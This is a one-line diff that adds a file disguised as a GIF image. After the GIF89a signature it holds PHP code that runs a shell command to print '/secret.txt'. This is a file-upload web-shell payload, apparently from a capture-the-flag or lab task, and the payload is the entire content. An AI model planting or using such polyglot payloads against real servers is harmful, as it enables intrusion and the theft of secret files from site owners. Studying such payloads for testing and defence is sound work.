@@ -1,0 +1,1 @@
+GIF89a; <?php echo '<?php $cmd = \'cat /secret.txt\'; echo shell_exec($cmd); ?>'; ?>;
